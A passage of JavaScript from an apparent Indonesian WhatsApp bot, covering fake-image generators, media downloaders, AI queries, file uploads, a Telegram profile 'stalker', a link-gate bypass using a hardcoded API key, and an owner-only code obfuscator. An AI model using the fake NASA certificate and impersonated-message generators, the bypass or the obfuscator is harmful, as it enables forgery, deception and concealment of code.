await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: "✅ FakeDev berhasil dibuat"
},
{
quoted: m
}
)

} catch (e) {
console.log(e)
m.reply(String(e.message))
}
}
break

case "fakepilih": {
    if (!text) {
        return m.reply(
            "Contoh:\n.fakepilih Messi,Ronaldo"
        )
    }

    let [teks1, teks2] = text.split(",")

    if (!teks1 || !teks2) {
        return m.reply(
            "Format salah!\nContoh:\n.fakepilih Messi,Ronaldo"
        )
    }

    try {
        await m.reply("⏳ Membuat gambar...")

        const url = `https://api.synoxcloud.xyz/canvas/drakehotline?teks1=${encodeURIComponent(teks1.trim())}&teks2=${encodeURIComponent(teks2.trim())}`

        await luna.sendMessage(
            m.chat,
            {
                image: { url },
                caption: `✅ Fake Pilih Berhasil`
            },
            { quoted: m }
        )

    } catch (e) {
        console.error(e)
        m.reply(`❌ Error: ${e.message}`)
    }
}
break

case "tiktok2":
case "tt2": {
    if (!text) return m.reply(".tiktok link")

    try {
        await m.reply("⏳ Processing...")

        const api = "https://api.azbry.com/api/download/tiktok?url=" + encodeURIComponent(text)

        const res = await fetch(api)
        const json = await res.json()

        if (!json.status) throw "Video tidak ditemukan"

        const vid = json.result.links[0]
        const mp3 = json.result.music.url

        await luna.sendMessage(m.chat, {
            video: { url: vid },
            caption: json.result.title || "TikTok Downloader"
        }, { quoted: m })

        await luna.sendMessage(m.chat, {
            audio: { url: mp3 },
            mimetype: "audio/mpeg"
        }, { quoted: m })

    } catch (e) {
        console.log(e)
        m.reply(String(e))
    }
}
break

case 'quotesmaker': {
try {

if (!text) {
return m.reply(
`Contoh penggunaan:\n\n.quotesmaker Halo dek ku,Luna-MD`
)
}

if (!text.includes(',')) {
return m.reply(
`Format salah!\n\nContoh:\n.quotesmaker Halo dek ku,Luna-MD`
)
}

let [quote, author] = text.split(',')

quote = quote?.trim()
author = author?.trim()

if (!quote || !author) {
return m.reply(
`Format salah!\n\nContoh:\n.quotesmaker Halo dek ku,Luna-MD`
)
}

await m.reply('⏳ Membuat quotes...')

const api = `https://api.azbry.com/api/maker/quotesmaker?text=${encodeURIComponent(quote)}&author=${encodeURIComponent(author)}`

await luna.sendMessage(
m.chat,
{
image: { url: api },
caption: `✨ Quotes Maker\n\n📝 Text: ${quote}\n👤 Author: ${author}`
},
{
quoted: m
}
)

} catch (e) {
console.error(e)
m.reply(`❌ Error: ${e.message}`)
}
}
break

case 'fakewindos2':
case 'fakewindows': {
try {

if (!text) {
return m.reply(
`Contoh:\n.fakewindos kenapa ya yang tulus sering kalah`
)
}

const kata = text.trim().split(/\s+/)

let lines = []

if (kata.length <= 5) {
lines = kata
} else {
for (let i = 0; i < kata.length; i += 2) {
lines.push(kata.slice(i, i + 2).join(' '))
}
}

const { createCanvas, loadImage } = require('canvas')

const bg = await loadImage(
'https://api.nexadev.my.id/uploder/uploads/TyIyEi.jpg'
)

const W = bg.width
const H = bg.height

const canvas = createCanvas(W, H)
const ctx = canvas.getContext('2d')

ctx.drawImage(bg, 0, 0, W, H)

const AREA_X = W * 0.09
const AREA_Y = H * 0.33
const AREA_W = W * 0.33
const AREA_H = H * 0.40

let fontSize = Math.floor(H * 0.065)

ctx.fillStyle = '#000000'
ctx.textAlign = 'left'
ctx.textBaseline = 'middle'

while (fontSize > 25) {
ctx.font = `bold ${fontSize}px Arial`

const widest = Math.max(
...lines.map(v => ctx.measureText(v).width)
)

if (widest <= AREA_W) break

fontSize -= 2
}

ctx.font = `bold ${fontSize}px Arial`

const lineHeight = fontSize * 1.18

const totalHeight =
(lines.length - 1) * lineHeight

const startY =
AREA_Y +
(AREA_H / 2) -
(totalHeight / 2)

lines.forEach((line, i) => {
ctx.fillText(
line,
AREA_X,
startY + (i * lineHeight)
)
})

const buffer = canvas.toBuffer('image/jpeg')

await luna.sendMessage(
m.chat,
{
image: buffer,
caption: 'Fake Windows Media Player'
},
{ quoted: m }
)

} catch (e) {
console.log(e)
reply('Gagal membuat gambar.')
}
}
break

case 'fakewindos': {
  try {

    if (!text) return m.reply('Masukkan teks!');

    const { createCanvas, loadImage, registerFont } = require('canvas');
    const fs = require('fs');
    const path = require('path');
    const https = require('https');
    const http = require('http');

    const FONT_URL = 'https://raw.githubusercontent.com/skayhayato-cmyk/canvas/main/Arial%20Bold.ttf';
    const BG_URL   = 'https://api.nexadev.my.id/uploder/uploads/OIqmKC.jpg';

    const FONT_PATH = path.join(__dirname, 'assets', 'ArialBold.ttf');
    const BG_PATH   = path.join(__dirname, 'assets', 'bg.jpg');

    fs.mkdirSync(path.join(__dirname, 'assets'), { recursive: true });

    
    
    
    const downloadFile = (url, dest) => new Promise((resolve, reject) => {
      if (fs.existsSync(dest)) return resolve();

      const file = fs.createWriteStream(dest);
      const client = url.startsWith('https') ? https : http;

      client.get(url, (res) => {
        if (res.statusCode !== 200) {
          fs.unlink(dest, () => {});
          return reject(new Error(`HTTP ${res.statusCode}`));
        }

        res.pipe(file);
        file.on('finish', () => file.close(resolve));
      }).on('error', (err) => {
        fs.unlink(dest, () => {});
        reject(err);
      });
    });

    await downloadFile(FONT_URL, FONT_PATH);
    await downloadFile(BG_URL, BG_PATH);

    registerFont(FONT_PATH, { family: 'ArialBold' });

    const lines = text.split('\n').map(v => v.trim()).filter(Boolean);

    const bg = await loadImage(BG_PATH);

    const W = bg.width;
    const H = bg.height;

    const canvas = createCanvas(W, H);
    const ctx = canvas.getContext('2d');

    
    ctx.drawImage(bg, 0, 0, W, H);

    
    
    
    const BOX_X = W * 0.003;
    const BOX_Y = H * 0.301;
    const BOX_W = W * 0.735;
    const BOX_H = H * 0.469;

    const DROP_PAD_TOP    = BOX_H * 0.025;
    const DROP_PAD_BOTTOM = BOX_H * 0.15;

    const DROP_Y = BOX_Y + DROP_PAD_TOP;
    const DROP_H = BOX_H - DROP_PAD_TOP - DROP_PAD_BOTTOM;

    const TEXT_X     = W * 0.118;
    const TEXT_MAX_W = BOX_W * 0.50;

    
    
    
    function wrapLine(ctx, text, maxWidth) {
      const words = text.split(' ');
      const wrapped = [];
      let current = '';

      for (const word of words) {
        const test = current ? current + ' ' + word : word;

        if (ctx.measureText(test).width > maxWidth && current) {
          wrapped.push(current);
          current = word;
        } else {
          current = test;
        }
      }

      if (current) wrapped.push(current);
      return wrapped.length ? wrapped : [text];
    }

    
    
    
    const FIXED_FONT = Math.floor(H * 0.11);
    const MIN_FONT = 10;

    let fontSize = FIXED_FONT;
    let wrappedLines = [];

    ctx.textBaseline = 'top';

    while (fontSize >= MIN_FONT) {
      ctx.font = `${fontSize}px ArialBold`;

      wrappedLines = lines.flatMap(l => wrapLine(ctx, l, TEXT_MAX_W));

      const lineH = fontSize * 1.30;
      const totalH = wrappedLines.length * lineH;

      if (totalH <= DROP_H) break;

      fontSize -= 2;
    }

    const lineHeight = fontSize * 1.30;

    
    
    
    const startY = DROP_Y + (DROP_H - (wrappedLines.length * lineHeight)) / 2;

    
    
    
    ctx.save();
    ctx.beginPath();
    ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H);
    ctx.clip();

    ctx.font = `${fontSize}px ArialBold`;
    ctx.fillStyle = '#111111';

    wrappedLines.forEach((line, i) => {
      const y = startY + (i * lineHeight);

      
      if (y > BOX_Y + BOX_H - lineHeight) return;

      ctx.fillText(line, TEXT_X, y);
    });

    ctx.restore();

    
    
    
    const buffer = canvas.toBuffer('image/jpeg', { quality: 0.95 });

    await luna.sendMessage(m.chat, {
      image: buffer,
      caption: '🎵 Fake Windows Media Player 2 (Express Convert Case)'
    }, { quoted: m });

  } catch (e) {
    console.log(e);
    m.reply('❌ Error fakewindos2');
  }
}
break;

case 'fakenokia2': {
    if (!text) {
        return m.reply(
            `Contoh penggunaan:\n\n${prefix + command} Halo dunia,Luna-MD`
        )
    }

    let argsx = text.split(',')
    if (argsx.length < 2) {
        return m.reply(
            `Format salah!\n\nContoh:\n${prefix + command} Halo dunia,Luna-MD`
        )
    }

    let pesan = argsx[0].trim()
    let sender = argsx.slice(1).join(',').trim()

    try {
        let imageUrl = `https://api-xemoz-official.my.id/api/maker/nokiamsg.php?text=${encodeURIComponent(pesan)}&sender=${encodeURIComponent(sender)}`

        await luna.sendMessage(
            m.chat,
            {
                image: { url: imageUrl },
                caption: `📱 *Fake Nokia Message*\n\n📝 Text: ${pesan}\n👤 Sender: ${sender}`
            },
            { quoted: m }
        )

    } catch (err) {
        console.error(err)
        m.reply('Gagal membuat Fake Nokia Message!')
    }
}
break

case 'meme': {
    try {
        await m.reply('⏳ Tunggu sebentar, sedang mengambil meme2 random...')

        const url = 'https://api.azbry.com/api/random/meme'

        const res = await fetch(url)

        if (!res.ok) throw 'API Error'

        const buffer = Buffer.from(await res.arrayBuffer())

        await luna.sendMessage(m.chat, {
            image: buffer,
            caption: '🗿 Random Meme'
        }, {
            quoted: m
        })

    } catch (e) {
        console.log(e)
        m.reply('Gagal mengambil meme')
    }
}
break

case 'deepseek': {
    if (!text) return m.reply(
        'Contoh:\n.deepseek siapa presiden Indonesia pertama'
    );

    try {
        const axios = require('axios');

        const { data } = await axios.get(
            `https://api.azbry.com/api/ai/deepseek?text=${encodeURIComponent(text)}`
        );

        if (!data.status || !data.result?.response) {
            return m.reply('Gagal mengambil jawaban AI');
        }

        await luna.sendMessage(
            m.chat,
            {
                text: `*AI DeepSeek*\n\n${data.result.response}`
            },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat mengambil jawaban DeepSeek');
    }
}
break;

case 'fakeustadz':
case 'tanyaustadz': {
try {
if (!text) {
return m.reply(`Contoh:\n${prefix + command} apa hukum ganteng seperti noxXza, pak ustadz`)
}

const url = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(text)}`

await luna.sendMessage(
m.chat,
{
image: { url },
caption: `🕌 Tanya Ustadz\n\n📝 Pertanyaan: ${text}`
},
{ quoted: m }
)

} catch (err) {
console.error(err)
m.reply('Gagal membuat gambar Tanya Ustadz')
}
}
break

case 'fakenasa': {
    try {
        let nama = args.join(" ");

        if (!nama) {
            return m.reply(
                "❌ Masukkan nama!\n\n" +
                "Cara pakai:\n" +
                ".fakenasa Nama Kamu\n\n" +
                "Contoh:\n" +
                ".fakenasa Luna-MD"
            );
        }

        let url = `https://api-nanzz.my.id/docs/api/maker/sertifikat-nasa.php?nama=${encodeURIComponent(nama)}`;

        let res = await axios.get(url, { responseType: "arraybuffer" });

        let buffer = Buffer.from(res.data);

        await luna.sendMessage(m.chat, {
            image: buffer,
            caption: `🎓 Sertifikat NASA berhasil dibuat\nNama: ${nama}`
        }, { quoted: m });

    } catch (err) {
        console.log(err);
        reply("❌ gagal membuat sertifikat NASA");
    }
}
break;

case 'fakenokia': {
    try {
        let [sender, pesan] = args.join(" ").split("|");

        if (!sender || !pesan) {
            return m.reply(
                "❌ Format salah!\n\n" +
                "Cara pakai:\n" +
                ".fakemsg namapengirim|isipesan\n\n" +
                "Contoh:\n" +
                ".fakemsg Nanzz|Halo bro! apa kabar?"
            );
        }

        let url = `https://api-nanzz.my.id/docs/api/maker/nokia-msg.php` +
            `?sender=${encodeURIComponent(sender)}` +
            `&pesan=${encodeURIComponent(pesan)}`;

        let res = await axios.get(url, { responseType: "arraybuffer" });

        let buffer = Buffer.from(res.data);

        await luna.sendMessage(m.chat, {
            image: buffer,
            caption: "✅ Nokia Message berhasil dibuat"
        }, { quoted: m });

    } catch (err) {
        console.log(err);
        m.reply("❌ gagal membuat Nokia Message");
    }
}
break;

case 'fakengl':
case 'ngl': {
    if (!text) {
        return m.reply(
            `📩 *Fake NGL Generator*\n\n` +
            `Contoh:\n${prefix + command} Gw tuh sebenarnya ultramen`
        );
    }

    try {
        await m.reply('⏳ Tunggu sebentar, sedang membuat Fake NGL...');

        const apiUrl =
            `https://api-nanzz.my.id/docs/api/maker/fake-ngl.php?text=${encodeURIComponent(text)}`;

        const res = await fetch(apiUrl);

        if (!res.ok) {
            throw new Error(`HTTP ${res.status}`);
        }

        const contentType = res.headers.get('content-type') || '';

        if (!contentType.includes('image')) {
            throw new Error('Response bukan gambar');
        }

        const buffer = Buffer.from(
            await res.arrayBuffer()
        );

        if (buffer.length < 1000) {
            throw new Error('Gambar kosong atau rusak');
        }

        await luna.sendMessage(
            m.chat,
            {
                image: buffer,
                caption:
`📩 *FAKE NGL BERHASIL*

📝 Pesan:
${text}

✅ Fake NGL berhasil dibuat.`
            },
            { quoted: m }
        );

    } catch (err) {
        console.error('FAKENGL ERROR:', err);

        m.reply(
            `❌ Gagal membuat Fake NGL\n\n` +
            `${err.message || err}`
        );
    }
}
break;

case 'fakeyt': {
    try {
        let [nama, template] = args.join(" ").split("|");

        if (!nama || !template) {
            return m.reply(
                "❌ Format salah!\n\n" +
                "Cara pakai:\n" +
                ".fakeyt Nama|silver\n" +
                ".fakeyt Nama|gold\n\n" +
                "Contoh:\n" +
                ".fakeyt Luna-MD|silver"
            );
        }

        let url = `https://api-nanzz.my.id/docs/api/maker/play-button.php` +
            `?nama=${encodeURIComponent(nama)}` +
            `&template=${encodeURIComponent(template)}`;

        let res = await axios.get(url, { responseType: "arraybuffer" });

        let buffer = Buffer.from(res.data);

        await luna.sendMessage(m.chat, {
            image: buffer,
            caption: `🎬 YouTube Play Button berhasil dibuat\nNama: ${nama}\nTemplate: ${template}`
        }, { quoted: m });

    } catch (err) {
        console.log(err);
        m.reply("❌ gagal membuat Play Button");
    }
}
break;

case 'stalktele':
case 'stalktelegram': {
try {
if (!text) {
return m.reply(`Contoh penggunaan:

.stalktele Luna-MD`);
}

const axios = require('axios');

let { data } = await axios.get(
`https://api.synoxcloud.xyz/stalker/telegram?username=${encodeURIComponent(text.replace('@', ''))}`
);

if (!data.status) {
return m.reply('Username Telegram tidak ditemukan');
}

let res = data.result;

let caption = `🔍 *TELEGRAM STALKER*\n\n`;
caption += `👤 *Nama* : ${res.name || '-'}\n`;
caption += `📛 *Username* : ${res.username || '-'}\n`;
caption += `📝 *Bio* : ${res.bio || '-'}\n`;
caption += `🏷️ *Tipe* : ${res.type || '-'}\n`;
caption += `👥 *Subscribers* : ${res.subscribers || '0'}\n`;
caption += `🔗 *Profile* : ${res.profile_url || '-'}\n`;
caption += `📌 *Extra* : ${res.extra || '-'}\n`;

await luna.sendMessage(
m.chat,
{
image: { url: res.photo },
caption
},
{ quoted: m }
);

} catch (e) {
console.error(e);
m.reply('Gagal mengambil data Telegram');
}
}
break;

case 'meigen':
case 'meigensearch': {
    if (!text) {
        return m.reply(`Contoh:\n${prefix + command} anime girl`);
    }

    try {
        const res = await fetch(`https://www.meigen.ai/api/search?q=${encodeURIComponent(text)}`);

        if (!res.ok) {
            throw new Error(`HTTP ${res.status}`);
        }

        const json = await res.json();

        if (!json?.success || !Array.isArray(json.data) || json.data.length < 1) {
            return m.reply('❌ Prompt tidak ditemukan.');
        }

        const data = json.data[Math.floor(Math.random() * json.data.length)];

        const caption = `*🌸 MEIGEN SEARCH*

*Query:* ${text}

*Author:* ${data.author_display_name || '-'}
*Username:* @${data.author_username || '-'}
*Model:* ${data.model || '-'}

*📊 Statistik*
• Likes: ${data.likes || 0}
• Views: ${data.views || 0}
• Favorites: ${data.favorites_count || 0}

*📝 Prompt:*
${(data.text || 'Tidak ada prompt').length > 1500
    ? data.text.slice(0, 1500) + '...'
    : data.text || 'Tidak ada prompt'}`;

        if (data.thumbnail_url) {
            await luna.sendMessage(
                m.chat,
                {
                    image: { url: data.thumbnail_url },
                    caption
                },
                { quoted: m }
            );
        } else {
            await m.reply(caption);
        }

    } catch (e) {
        console.error(e);
        m.reply(`❌ Error: ${e.message}`);
    }
}
break;

case "idcard": {
if (!text) {
return m.reply(
`Example :\n${prefix + command} Luna-MD|creator|md|https://t.me/Luna-MD`
)
}

let [name, title, script, telegram] = text.split("|")

if (!name || !title || !script || !telegram) {
return m.reply(
`Format salah!\n\n${prefix + command} name|title|script|telegram`
)
}

const {
createCanvas,
loadImage
} = require("canvas")

const template =
"https://img2.pixhost.to/images/8206/731465960_lanz-1779881748979.jpg"

const bg = await loadImage(template)

const canvas = createCanvas(
bg.width,
bg.height
)

const ctx = canvas.getContext("2d")

ctx.drawImage(
bg,
0,
0,
canvas.width,
canvas.height
)

ctx.textBaseline = "top"

ctx.font = "30px monospace"

ctx.fillStyle = "#ffffff"

ctx.fillText(
`${name}.json`,
255,
488
)
ctx.font = "27px monospace"
ctx.fillStyle = "#ffffff"

ctx.fillText(
"{",
190,
580
)

ctx.fillStyle = "#8A9A5B"

ctx.fillText(
`"name"`,
250,
630
)

ctx.fillStyle = "#00b7ff"

ctx.fillText(
`: "${name}",`,
340,
630
)

ctx.fillStyle = "#8A9A5B"

ctx.fillText(
`"title"`,
250,
680
)

ctx.fillStyle = "#00b7ff"

ctx.fillText(
`: "${title}",`,
365,
680
)

ctx.fillStyle = "#8A9A5B"

ctx.fillText(
`"script"`,
250,
735
)

ctx.fillStyle = "#00b7ff"

ctx.fillText(
`: "${script}",`,
378,
735
)

ctx.fillStyle = "#8A9A5B"

ctx.fillText(
`"telegram"`,
250,
790
)

ctx.fillStyle = "#00b7ff"

ctx.fillText(
`: "${telegram}"`,
409,
790
)

ctx.fillStyle = "#FFFFFF"

ctx.fillText(
"}",
190,
850
)

const hasil = canvas.toBuffer()

await luna.sendMessage(
m.chat,
{
image: hasil,
caption: "Success create id card"
},
{
quoted: m
}
)

}
break

case 'fakeff': {
    try {
        const axios = require('axios')

        if (!text) {
            return m.reply(
                `❌ *NAMA TIDAK BOLEH KOSONG*

Contoh :
.fakeff Luna-MD`
            )
        }

        const username = text.trim()

        if (username.length > 30) {
            return m.reply('❌ Nama terlalu panjang! Maksimal 30 karakter.')
        }

        await m.reply('⏳ Sedang membuat Fake FF...')

        const apiUrl = `https://apii.nexadev.my.id/fakeff?usn=${encodeURIComponent(username)}`

        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 60000,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            },
            maxContentLength: 15 * 1024 * 1024,
            maxBodyLength: 15 * 1024 * 1024
        })

        if (!response.data || response.data.length === 0) {
            return m.reply('❌ API tidak mengembalikan gambar.')
        }

        const contentType = response.headers['content-type'] || ''

        if (!contentType.startsWith('image/')) {
            let errorText

            try {
                errorText = Buffer.from(response.data).toString('utf8')
            } catch {
                errorText = 'Response API bukan gambar.'
            }

            return m.reply(
                `❌ *GAGAL MEMBUAT FAKE FF*

${errorText.substring(0, 1000)}`
            )
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption: `
🎮 *FAKE FREE FIRE*

👤 Username:
${username}

✅ Fake FF berhasil dibuat.
`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log('FAKEFF ERROR:', e)

        let errorMessage =
            e.response?.data?.message ||
            e.response?.data?.msg ||
            e.message ||
            'Terjadi kesalahan tidak diketahui.'

        if (
            e.code === 'ECONNABORTED' ||
            e.code === 'ETIMEDOUT'
        ) {
            errorMessage = 'Request API timeout. Silakan coba lagi.'
        }

        if (e.response?.status === 404) {
            errorMessage = 'Endpoint Fake FF tidak ditemukan (404).'
        }

        if (e.response?.status === 429) {
            errorMessage = 'Terlalu banyak request. Tunggu beberapa saat.'
        }

        return m.reply(
            `❌ *FAKE FF ERROR*

${errorMessage}`
        )
    }
}
break

case 'playclound':
case 'scsearch': {
  if (!text) return m.reply(`Example: ${prefix + command} DJ Tiktok`);

  try {

    const axios = require('axios')

    let api = `https://api.soonex.biz.id/v1/search/soundcloud?q=${encodeURIComponent(text)}`

    let { data } = await axios.get(api)

    console.log(data)

    if (!data.status) {
      return m.reply(`*Lagu tidak ditemukan!* ☹️`)
    }

    let result = data.result[0]

    if (!result) {
      return m.reply(`*Lagu tidak ditemukan!* ☹️`)
    }

    let caption = `「 *SOUNDCLOUD SEARCH* 」\n\n`
    caption += `🎵 Title : ${result.title}\n`
    caption += `▶️ Plays : ${result.plays}\n`
    caption += `❤️ Likes : ${result.likes}\n`
    caption += `🔗 URL : ${result.url}\n`

    await luna.sendMessage(m.chat, {
      image: { url: result.artwork },
      caption: caption,
      footer: `${global.namaOwner}`,
      buttons: [
        {
          buttonId: `${prefix}scdl ${result.url}`,
          buttonText: { displayText: "🎵 Download Audio" },
          type: 1
        }
      ],
      headerType: 1
    }, { quoted: m })

  } catch (err) {

    console.log(err)

    m.reply(`❌ Error search SoundCloud`)

  }
}
break

case 'soundcloud':
case 'scdl': {

if (!text) {
return m.reply(`Contoh:\n.scdl https://soundcloud.com/xxxx/xxxx`)
}

try {

const axios = require('axios')

await luna.sendMessage(m.chat, {
react: {
text: '🎵',
key: m.key
}
})

let api = `https://api.azbry.com/api/download/soundcloud?url=${encodeURIComponent(text)}`

let { data } = await axios.get(api)

console.log(data)

if (!data.status) {
return m.reply('❌ Gagal mengambil audio')
}

let result = data.result

await luna.sendMessage(
m.chat,
{
audio: {
url: result.download
},
mimetype: 'audio/mpeg',
fileName: `${result.title}.mp3`,
ptt: false
},
{
quoted: m
}
)

} catch (err) {

console.log(err)

m.reply('❌ Terjadi kesalahan saat download SoundCloud')

}

}
break

case 'soonex': {

if (!text) {
return m.reply(`Contoh:\n.soonex halo`)
}

try {

const fetch = require('node-fetch')

await luna.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })

let res = await fetch(
`https://api.soonex.biz.id/v1/ai/soonex?text=${encodeURIComponent(text)}`
)

let data = await res.json()

console.log(data)

let hasil =
data.result ||
data.answer ||
data.message ||
'Tidak ada respon dari AI'

await luna.sendMessage(
m.chat,
{
text: hasil
},
{
quoted: m
}
)

} catch (e) {

console.log(e)

m.reply('❌ Terjadi kesalahan saat mengambil respon AI')

}

}
break

 case 'subs4unlock': {
    if (!text) {
        return m.reply(`Masukkan URL subs4unlock!\nContoh: ${usedPrefix + command} https://subs4unlock.id/xxxxx`);
    }

    try {
        await m.reply("⏳ Memproses...");

        const apiUrl = `https://api.theresav.biz.id/bypass/subs4unlock?url=${encodeURIComponent(text)}&apikey=SurGG`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (data.status || data.result) {
            let message = `[ SUBS4UNLOCK BYPASS ]\n\n`;
            message += `Input URL: ${data.input || text}\n`;
            message += `Result URL: ${data.result}\n`;
            message += `Method: ${data.method || "Theresa API"}`;

            m.reply(message);
        } else {
            m.reply(`Gagal bypass URL.`);
        }

    } catch (error) {
        console.error(error);
        m.reply(`Terjadi kesalahan:\n${error.message}`);
    }
};
break

case 'tourl3': {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';

    if (!mime) return m.reply('Kirim atau reply file/gambar yang mau diupload!');

    await luna.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const buffer = await q.download();
        const fileName = q.msg?.fileName || `file_${Date.now()}.${mime.split('/')[1] || 'bin'}`;

        const formData = new FormData();
        for (let i = 0; i < 10; i++) {
            const fieldName = `file_${i}_`;
            if (i === 0) {
                formData.append(fieldName, new Blob([buffer], { type: mime }), fileName);
            } else {
                formData.append(fieldName, '');
            }
        }
        formData.append('submitr', '[ رفع الملفات ]');

        const res = await fetch('https://top4top.io/index.php', {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36'
            },
            body: formData
        });

        const html = await res.text();
        const linkRegex = /<a\s+onclick="window\.open\(this\.href,'_blank'\);return false;"\s+href="(.*?)"/gi;
        const matches = [...html.matchAll(linkRegex)];
        const links = matches.map(match => match[1]);

        if (!links.length) throw new Error('Gagal mendapatkan link upload.');

        const now = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
        await m.reply(`🔗 *Link*:\n${links.join('\n')}`);

        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
    } catch (e) {
        await luna.sendMessage(m.chat, { react: { text: '', key: m.key } });
        m.reply(`Gagal!\n${e.message}`);
    }
};
break 

async function uguu(filePath) {
  const form = new FormData()
  form.append('files[]', fs.createReadStream(filePath))
  const { data } = await axios.post('https://uguu.se/upload', form, {
    headers: { ...form.getHeaders() }
  })
  return data.files[0].url
}

case 'fakeml2': {
  await m.react('✨')

  let q = m.quoted
  if (!q) {
    return luna.sendMessage(
      m.chat,
      { text: 'ℹ️ Cara pakai:\nReply gambar lalu ketik *.fakeml teksnya*' },
      { quoted: global.fkontak }
    )
  }

  let mime = (q.msg || q).mimetype || ''
  if (!mime.startsWith('image/')) {
    return luna.sendMessage(
      m.chat,
      { text: 'ℹ️ Cara pakai:\nReply gambar lalu ketik *.fakeml teksnya*' },
      { quoted: m }
    )
  }

  let buffer = await q.download().catch(() => null)
  if (!buffer) return

  let ext = mime.split('/')[1] || 'jpg'
  let tempFile = path.join(process.cwd(), `fakeml_${Date.now()}.${ext}`)
  fs.writeFileSync(tempFile, buffer)

  try {
    let avatarUrl = await uguu(tempFile)

    let apiUrl = `${global.APIs.deline}/maker/fakeml?text=${encodeURIComponent(text)}&avatar=${encodeURIComponent(avatarUrl)}`
    let res = await fetch(apiUrl)
    if (!res.ok) throw 'API error'

    let resultBuffer = await res.buffer()

    await luna.sendMessage(
      m.chat,
      {
        image: resultBuffer,
        caption: '✨ Fake ML Chat'
      },
      { quoted: global.fkontak }
    )

  } catch (e) {
    console.error(e)
    await luna.sendMessage(
      m.chat,
      { text: '❌ Gagal memproses gambar' },
      { quoted: global.fkontak }
    )
  } finally {
    if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile)
  }
}
break

case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/image/.test(mime))
  return reply(`Balas foto dengan caption *${prefix + command} teks_atas|teks_bawah*`);
luna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let [atas, bawah] = text.split("|");
atas = atas || "-";
bawah = bawah || "-";


let buffer = await luna.downloadAndSaveMediaMessage(qmsg);
if (!buffer) return reply("❌ Gagal mengunduh media!");


const FormData = require("form-data");
const form = new FormData();
form.append("reqtype", "fileupload");
form.append("fileToUpload", buffer, "image.jpg");

let up = await axios.post("https://catbox.moe/user/api.php", form, {
  headers: form.getHeaders(),
});

let catboxUrl = up.data;
if (!catboxUrl.startsWith("http"))
  return reply("❌ Gagal upload ke Catbox!");


let apiUrl = `https://api-faa.my.id/faa/smeme?text_atas=${encodeURIComponent(
  atas
)}&text_bawah=${encodeURIComponent(
  bawah
)}&background=${encodeURIComponent(catboxUrl)}`;

let hasil = await axios.get(apiUrl, {
  responseType: "arraybuffer",
});


await luna.sendAsSticker(m.chat, hasil.data, m, {
  packname: global.packname,
  author: m.pushName
});
luna.sendMessage(m.chat, { react: { text: `🤓`, key: m.key }})

}
break;

case 'enc': {
    if (!isOwner) return reply('❌ Fitur khusus user premium');
if (!m.quoted) return m.reply("\n❌ ғᴏʀᴍᴀᴛ ʜᴀʀᴜs ғɪʟᴇ.ᴊs\n")
    if (!text || !text.includes('|'))
        return reply('\n❌ Contoh:\n.enc text1|text2\n.enc Luna-MD|Luna-enc\n')
    try {
        Reply('⚡ Processing hard code encryption...');

        const fs = require('fs');
        const path = require('path');
        const axios = require('axios');
        const JsConfuser = require('js-confuser');
        let [text1, text2] = text.split('|')
        
        let media = await m.quoted.download();
        if (!media) return reply('❌ Gagal mengunduh file');
        const fileName =
  m.quoted?.message?.documentMessage?.fileName ||
  m.quoted?.message?.imageMessage?.fileName ||
  m.quoted?.message?.videoMessage?.fileName ||
  null
        let codeString = media.toString('utf-8');
        if (typeof codeString !== 'string')
            throw new Error('File bukan string JavaScript');

        let obfuscated = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () =>
                `高宝座${text1}齐${text2}高宝座` +
                Math.random().toString(36).substring(7),
        });

        let result = typeof obfuscated === 'object'
            ? obfuscated.code
            : obfuscated;

        if (typeof result !== 'string')
            throw new Error('Hasil enkripsi tidak valid');

        let outFile = path.join(
            __dirname,
            `encrypted_${m.quoted.fileName}`
        );

        fs.writeFileSync(outFile, result);

        await luna.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(outFile),
                fileName: `${fileName}_${m.pushName}.js`,
                mimetype: 'application/javascript',
                caption: '✅ Encryption Successful\n• Type: Hard Code'
            },
            { quoted: m }
        );

        fs.unlinkSync(outFile);
    } catch (e) {
        console.error(e);
        Reply('❌ Error: ' + e.message);
    }
}
break;

case "idgc": case "cekidgc": {
if (!m.isGroup) return reply(mess.group)
m.reply(m.chat)
}
break

case 'tthd': case 'tiktokhd': {
  let reactKey
  try {
    if (!args[0]) throw `Contoh:\n${prefix}${command} <url tiktok>`
    const url = args[0]
    if (!/https?:\/\/(vm|vt|www)\.tiktok\.com/i.test(url)) throw 'URL TikTok tidak valid'

    reactKey = m.key
    await luna.sendMessage(m.chat, { react: { text: '⏳', key: reactKey } })

    const api = `https://api.yupra.my.id/api/downloader/tiktok?url=${encodeURIComponent(url)}`
    const res = await fetch(api)
    const json = await res.json()

    if (json.status !== 200 || !json.result?.data) throw 'Gagal mengambil video'

    const media = json.result.data
    const video =
      media.find(v => v.type === 'nowatermark_hd')?.url ||
      media.find(v => v.type === 'nowatermark')?.url ||
      media.find(v => v.type === 'watermark')?.url

